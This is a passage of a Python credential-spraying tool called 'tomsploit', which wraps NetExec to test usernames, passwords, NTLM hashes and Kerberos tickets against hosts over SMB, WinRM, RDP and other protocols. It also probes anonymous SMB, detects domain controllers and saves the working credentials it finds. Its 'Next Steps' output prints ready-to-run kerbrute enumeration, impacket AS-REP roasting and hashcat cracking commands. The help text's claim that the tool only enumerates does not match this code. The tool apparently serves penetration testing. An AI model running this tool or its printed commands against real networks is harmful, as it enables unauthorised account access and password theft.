                              f"{color}{msg}{tag}{RESET}")
                elif marker in ("[-]", "[!]"):
                    lines.append((marker, msg))

            # Surface stderr only when stdout was empty
            if stderr and not stdout:
                for raw in stderr.split("\n"):
                    raw = raw.strip()
                    if raw:
                        lines.append(("[-]", raw))

            self._tick()
        return lines, successes, target_info

    # ─── anonymous SMB probe ─
    def _scan_anon_smb(self, target: str) -> tuple[list[str], bool]:
        cmd = ["nxc", "smb", target, "-u", "", "-p", "",
               "--timeout", str(NETEXEC_TIMEOUT), "--log", self.log_file]
        try:
            stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
        except InterruptedError:
            return [], False
        if timed_out:
            return ["[!] Anonymous SMB check timed out"], False
        out_lines: list[str] = []
        success = False
        for raw in stdout.split("\n"):
            line = raw.strip()
            if not line:
                continue
            out_lines.append(line)
            marker, msg = parse_nxc_line(line)
            if marker == "[+]":
                success = True
                self._say(f"  {YELLOW}{BOLD}⚡ SMB (anon){RESET} {YELLOW}{msg}{RESET}")
        if stderr and not stdout:
            for raw in stderr.split("\n"):
                if raw.strip():
                    out_lines.append(raw.strip())
        return out_lines, success

    # ─── one target ─
    def _scan_target(self, target: str) -> TargetResult:
        result = TargetResult(target=target)
        print_target_header(target)

        if self.no_port_probe:
            open_protos = list(self.protocols)
        else:
            open_protos = probe_protocols(target, self.protocols)
        result.open_protocols = open_protos
        result.closed_protocols = [p for p in self.protocols if p not in open_protos]

        if not open_protos:
            result.scanned = False
            result.skipped_reason = "no open ports"
            print(f"    {RED}✘ No open ports — skipping.{RESET}\n")
            return result

        print_port_probe(result, self.quiet)

        # Build task list
        tasks: list[tuple[str, bool]] = []
        for proto in open_protos:
            tasks.append((proto, False))
            if proto in LOCAL_AUTH_PROTOCOLS and not self.kerberos:
                tasks.append((proto, True))

        # Reset progress
        with self._progress_lock:
            self._done = 0
            self._total = len(tasks) * len(self.creds)
            self._redraw()

        start = time.time()
        anon_lines: list[str] = []
        anon_success = False

        # Run protocols concurrently; anon SMB as a side task
        with ThreadPoolExecutor(max_workers=max(2, self.workers)) as pool:
            anon_future = None
            if "smb" in open_protos and not self.kerberos:
                anon_future = pool.submit(self._scan_anon_smb, target)

            future_to_task = {
                pool.submit(self._scan_protocol, proto, target, scope): (proto, scope)
                for proto, scope in tasks
            }
            for fut in as_completed(future_to_task):
                if self._stop.is_set():
                    break
                proto, scope = future_to_task[fut]
                key = f"{proto}-{'local' if scope else 'domain'}"
                try:
                    lines, successes, tinfo = fut.result()
                except Exception as exc:
                    lines = [("[!]", f"Task error: {exc}")]
                    successes = []
                    tinfo = ""
                    if self.debug:
                        import traceback; traceback.print_exc()
                result.protocol_lines[key] = lines
                if tinfo and not result.target_info:
                    result.target_info = tinfo
                for s in successes:
                    (result.guests if s.is_guest else result.successes).append(s)

            if anon_future is not None:
                try:
                    anon_lines, anon_success = anon_future.result()
                except Exception as exc:
                    anon_lines = [f"[!] Anonymous SMB error: {exc}"]
        result.anon_smb_lines = anon_lines
        result.anon_smb = anon_success

        # Derive hostname / domain / DC / real IP from target_info
        result.hostname = extract_hostname(result.target_info)
        result.domain = extract_domain(result.target_info)
        result.is_dc = looks_like_dc(result.target_info)

        # Real IP: scan any line for an IPv4
        for k, lines in result.protocol_lines.items():
            for _, msg in lines:
                ip = extract_ipv4(msg)
                if ip:
                    result.real_ip = ip; break
            if result.real_ip:
                break
        if not result.real_ip:
            for line in anon_lines:
                ip = extract_ipv4(line)
                if ip:
                    result.real_ip = ip; break
        if not result.real_ip:
            result.real_ip = target

        result.elapsed = time.time() - start
        self._clear_progress()
        return result

    # ─── full scan ─
    def run(self) -> int:
        if not self.quiet:
            self._print_banner()
        results: list[TargetResult] = []
        try:
            for target in self.targets:
                if self._stop.is_set():
                    break
                try:
                    r = self._scan_target(target)
                    print_protocol_results(r, self.quiet)
                    print_valid_section(r, self.extra_hash, self.quiet)
                    if self.creds_file and r.successes:
                        try:
                            append_creds(self.creds_file, r)
                        except OSError as exc:
                            print(f"  {YELLOW}[!] Could not write creds file: {exc}{RESET}")
                    results.append(r)
                except KeyboardInterrupt:
                    raise
                except Exception as exc:
                    self._clear_progress()
                    print(f"\n  {RED}{BOLD}✗ Error on {target}:{RESET} "
                          f"{exc.__class__.__name__}: {exc}")
                    if self.debug:
                        import traceback; traceback.print_exc()
                    else:
                        print(f"  {DIM}Re-run with --debug for traceback.{RESET}")
                    failed = TargetResult(target=target)
                    failed.scanned = False
                    failed.skipped_reason = f"error: {exc.__class__.__name__}"
                    results.append(failed)
        finally:
            if len(results) > 1 and not self._stop.is_set():
                self._print_summary(results)
            if self.json_out:
                self._write_json(results)
            if not self._stop.is_set():
                self._print_next_steps(results)
        return 130 if self._stop.is_set() else 0

    def _print_banner(self) -> None:
        proto_label = ("all" if len(self.protocols) == len(ALL_PROTOCOLS)
                       else ",".join(self.protocols))
        total = (len(self.targets) * len(self.creds)
                 * (len(self.protocols) + sum(1 for p in self.protocols
                                              if p in LOCAL_AUTH_PROTOCOLS)))
        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
        print(f"  {CYAN}{BOLD}⚡ tomsploit{RESET}")
        print(f"{'═' * BANNER_WIDTH}")
        print(f"  Targets         {DIM}│{RESET} {BOLD}{len(self.targets):<11}{RESET} "
              f"Protocols {DIM}│{RESET} {BOLD}{proto_label}{RESET}")
        print(f"  Users           {DIM}│{RESET} {BOLD}{len(self.users):<11}{RESET} "
              f"Workers   {DIM}│{RESET} {BOLD}{self.workers}{RESET}")
        cred_label = f"{len(self.passwords)}p / {len(self.hashes)}h"
        print(f"  Credentials     {DIM}│{RESET} {BOLD}{cred_label:<11}{RESET} "
              f"Timeout   {DIM}│{RESET} {BOLD}{NETEXEC_TIMEOUT}s{RESET}/attempt")
        print(f"  Log file        {DIM}│{RESET} {BOLD}{self.log_file}{RESET}")
        if self.creds_file:
            print(f"  Creds output    {DIM}│{RESET} {BOLD}{self.creds_file}{RESET}")
        if self.kerberos:
            print(f"  Auth method     {DIM}│{RESET} {BOLD}Kerberos cache{RESET}")
        print(f"  Total attempts  {DIM}│{RESET} {BOLD}{total}{RESET}")
        print(f"{'═' * BANNER_WIDTH}\n")

    def _print_summary(self, results: list[TargetResult]) -> None:
        n_win = sum(1 for r in results if r.successes or r.anon_smb)
        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
        print(f"  {CYAN}{BOLD}📊 Summary{RESET}  {DIM}({len(results)} targets){RESET}")
        print(f"{'═' * BANNER_WIDTH}")
        for r in results:
            ok = r.successes or r.anon_smb
            icon = f"{GREEN}✔{RESET}" if ok else f"{RED}✘{RESET}"
            host = r.target
            if r.hostname:
                host += f" {DIM}({r.hostname}){RESET}"
            if r.is_dc:
                host += f" {YELLOW}[DC]{RESET}"
            n_creds = len(r.successes) + (1 if r.anon_smb else 0)
            cred_tag = (f" {GREEN}{n_creds} cred{'s' if n_creds != 1 else ''}{RESET}"
                        if n_creds else "")
            time_tag = f" {DIM}[{r.elapsed:.1f}s]{RESET}"
            skip_tag = (f" {DIM}({r.skipped_reason}){RESET}"
                        if not r.scanned else "")
            print(f"  {icon} {host}{cred_tag}{time_tag}{skip_tag}")
        print(f"\n  Total: {GREEN}{BOLD}{n_win}{RESET}/{len(results)} "
              f"targets with credentials")
        print(f"{'═' * BANNER_WIDTH}\n")

    def _write_json(self, results: list[TargetResult]) -> None:
        def ser_succ(s: Success) -> dict:
            return {
                "protocol": s.protocol, "scope": s.scope,
                "domain": s.domain, "user": s.user, "secret": s.secret,
                "auth_type": s.auth_type.value,
                "is_admin": s.is_admin, "is_guest": s.is_guest,
                "raw_message": s.raw_message,
            }
        payload = {
            "scan_time": datetime.now().isoformat(timespec="seconds"),
            "log_file": self.log_file,
            "creds_file": self.creds_file,
            "kerberos": self.kerberos,
            "protocols": self.protocols,
            "targets": [
                {
                    "target": r.target, "real_ip": r.real_ip,
                    "hostname": r.hostname, "domain": r.domain,
                    "is_dc": r.is_dc,
                    "scanned": r.scanned,
                    "skipped_reason": r.skipped_reason or None,
                    "elapsed_seconds": round(r.elapsed, 2),
                    "open_protocols": r.open_protocols,
                    "closed_protocols": r.closed_protocols,
                    "anon_smb": r.anon_smb,
                    "successes": [ser_succ(s) for s in r.successes],
                    "guests": [ser_succ(s) for s in r.guests],
                }
                for r in results
            ],
        }
        try:
            with open(self.json_out, "w") as f:
                json.dump(payload, f, indent=2)
            # Path is shown in the "Next Steps" section, no separate message.
        except OSError as exc:
            print(f"  {YELLOW}[!] Could not write JSON: {exc}{RESET}")

    def _print_next_steps(self, results: list[TargetResult]) -> None:
        """Show actionable follow-ups after the scan. Three subsections:

          1. No-auth AD attacks (if any DC was detected)
          2. Hash-cracking command reference (only if DC detected — otherwise
             you wouldn't have anything to crack)
          3. Output-file paths (creds TSV, JSON, nxc log)
        """
        if self.quiet:
            return

        # Group DCs by domain so the per-domain commands are emitted once,
        # even if a domain has multiple DCs in the target list.
        dcs_by_domain: dict[str, list[tuple[str, str]]] = {}
        for r in results:
            if r.is_dc and r.real_ip:
                key = r.domain or "<DOMAIN>"
                dcs_by_domain.setdefault(key, []).append(
                    (r.hostname or r.real_ip, r.real_ip))

        has_dcs = bool(dcs_by_domain)
        has_files = bool(self.creds_file or self.json_out or self.log_file)
        if not has_dcs and not has_files:
            return

        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
        print(f"  {CYAN}{BOLD}🎯 Next Steps{RESET}")
        print(f"{'═' * BANNER_WIDTH}")

        if has_dcs:
            # DC list
            print(f"\n  {BOLD}Domain Controllers detected{RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            for domain, hosts in dcs_by_domain.items():
                for hostname, ip in hosts:
                    suffix = f" {DIM}—{RESET} {domain}" if domain != "<DOMAIN>" else ""
                    print(f"    {YELLOW}►{RESET} {BOLD}{hostname}{RESET} "
                          f"{DIM}({ip}){RESET}{suffix}")

            # No-auth attacks per unique domain.
            # AS-REP roast without auth + kerbrute user enumeration. These
            # are valuable EVEN when working creds were found — they find
            # additional users that may have crackable hashes.
            print(f"\n  {BOLD}No-auth AD attacks{RESET} "
                  f"{DIM}(try alongside any creds found above){RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            first = True
            for domain, hosts in dcs_by_domain.items():
                if not first:
                    print()
                first = False
                # Pick the first DC's IP — they all serve the same domain.
                dc_ip = hosts[0][1]
                dom = domain if domain != "<DOMAIN>" else "<DOMAIN>"
                print(f"        {DIM}# enumerate valid usernames at {dom}{RESET}")
                print(f"        kerbrute userenum --dc {dc_ip} -d {dom} "
                      f"/usr/share/seclists/Usernames/Names/names.txt")
                print()
                print(f"        {DIM}# AS-REP roast — any user with preauth disabled = free hash{RESET}")
                print(f"        impacket-GetNPUsers {dom}/ -dc-ip {dc_ip} "
                      f"-request -no-pass -usersfile users.txt")

            # Cracking reference — mode numbers are easy to forget under pressure.
            print(f"\n  {BOLD}Cracking captured hashes{RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            print(f"        {DIM}# AS-REP (Kerberos 5 AS-REP){RESET}")
            print(f"        hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt")
            print()
            print(f"        {DIM}# Kerberoast (Kerberos 5 TGS-REP){RESET}")
            print(f"        hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt")
            print()
            print(f"        {DIM}# NTDS / SAM (NTLM){RESET}")
            print(f"        hashcat -m 1000 ntds.hash /usr/share/wordlists/rockyou.txt")

        if has_files:
            print(f"\n  {BOLD}Output files{RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            # Fixed-width labels for visual alignment.
            if self.creds_file:
                print(f"    {DIM}Valid creds (TSV):{RESET}  {self.creds_file}")
            if self.json_out:
                print(f"    {DIM}JSON results:     {RESET}  {self.json_out}")
            if self.log_file:
                print(f"    {DIM}nxc log:          {RESET}  {self.log_file}")

        print(f"\n{'═' * BANNER_WIDTH}\n")


# ─── CLI ───────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="tomsploit",
        description="Run nxc across protocols and credentials. "
                    "Enumeration only — does not exploit.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  tomsploit -t 192.168.1.10 -u admin -p 'Password123'
  tomsploit -t 192.168.1.0/24 -u users.txt -p passwords.txt
  tomsploit -t target.htb -u admin -H aad3b...:31d6cfe0...
  tomsploit -t 192.168.1.10 -u admin -k
  tomsploit -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp
  tomsploit -t targets.txt -u u.txt -p p.txt --creds-file creds.tsv
""",
    )
    p.add_argument("-t", "--target", required=True,
                   help="IP, hostname, CIDR, or file containing any of these.")
    p.add_argument("-u", "--user", required=True,
                   help="Username or path to users file.")
    p.add_argument("-p", "--password",
                   help="Password or path to passwords file.")
    p.add_argument("-H", "--hash",
                   help="NTLM hash (LM:NT or NT). May be a file of hashes.")
    p.add_argument("-k", "--kerberos", action="store_true",
                   help="Use Kerberos ticket cache (--use-kcache). "
                        "Requires KRB5CCNAME. Cannot mix with -p/-H.")
    p.add_argument("-o", "--output",
                   help="nxc log file path (default: YYYY-MM-DD_HH-MM-SS.txt).")
    p.add_argument("--creds-file", metavar="FILE",
                   help="Append valid credentials to a TSV file.")
    p.add_argument("-w", "--workers", type=int, default=DEFAULT_WORKERS,
                   help=f"Parallel workers (default: {DEFAULT_WORKERS}).")
    p.add_argument("--protocols", metavar="LIST",
                   help=f"Comma-separated subset. Valid: {','.join(ALL_PROTOCOLS)}")
    p.add_argument("--no-port-probe", action="store_true",
                   help="Skip pre-flight TCP port probe.")
    p.add_argument("--max-cidr-hosts", type=int, default=DEFAULT_MAX_CIDR_HOSTS,
                   help=f"Max hosts in any one CIDR (default: {DEFAULT_MAX_CIDR_HOSTS}).")
    p.add_argument("-q", "--quiet", action="store_true",
                   help="Suppress banner and negatives.")
    p.add_argument("--no-color", action="store_true",
                   help="Disable ANSI colors.")
    p.add_argument("--debug", action="store_true",
                   help="Print full Python tracebacks on errors.")
    p.add_argument("--json-output", metavar="FILE",
                   help="Write structured results to a JSON file.")
    return p.parse_args()


def main() -> int:
    args = parse_args()
    configure_colors(args.no_color)

    if not shutil.which("nxc"):
        print(f"{RED}{BOLD}Error:{RESET} 'nxc' (NetExec) not on PATH.",
              file=sys.stderr)
        return 1

    if args.kerberos and (args.password or args.hash):
        print(f"{RED}{BOLD}Error:{RESET} -k cannot combine with -p or -H.",
              file=sys.stderr)
        return 1
    if not args.kerberos and not args.password and not args.hash:
        print(f"{RED}{BOLD}Error:{RESET} need one of -p, -H, or -k.",
              file=sys.stderr)
        return 1

    try:
        raw_targets = read_value_or_file(args.target)
        targets = expand_targets(raw_targets, args.max_cidr_hosts)
        if not targets:
            raise ValueError("No targets after expansion.")
        users = read_value_or_file(args.user)
        passwords = read_value_or_file(args.password) if args.password else []
        hashes = read_value_or_file(args.hash) if args.hash else []
        protocols = parse_protocol_list(args.protocols)
        if not protocols:
            raise ValueError("No protocols selected.")
        log_file = args.output or datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
        # extra_hash for PtH suggestions when password creds succeed
        extra_hash = hashes[0] if len(hashes) == 1 else None

        runner = TomSploit(
            targets=targets, users=users, passwords=passwords,
            hashes=hashes, kerberos=args.kerberos,
            protocols=protocols, log_file=log_file,
            creds_file=args.creds_file, json_out=args.json_output,
            workers=args.workers, quiet=args.quiet, debug=args.debug,
            no_port_probe=args.no_port_probe, extra_hash=extra_hash,
        )
    except ValueError as exc:
        print(f"{RED}{BOLD}Error:{RESET} {exc}", file=sys.stderr)
        return 1

    interrupted = {"n": 0}

    def _sigint(_signum, _frame):
        interrupted["n"] += 1
        if interrupted["n"] == 1:
            sys.stderr.write(
                f"\n  {YELLOW}{BOLD}⚠ Cancelling — Ctrl-C again to force.{RESET}\n"
            )
            sys.stderr.flush()
            runner.cancel()
        else:
            os._exit(130)
    signal.signal(signal.SIGINT, _sigint)

    try:
        return runner.run()
    except KeyboardInterrupt:
        runner.cancel()
        return 130


if __name__ == "__main__":
    sys.exit(main())

# ── MIT License ────────────────────────────────────────────────────────
# Copyright (c) 2026 Kazgangap
# Modifications Copyright (c) 2026 twhitehead290
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
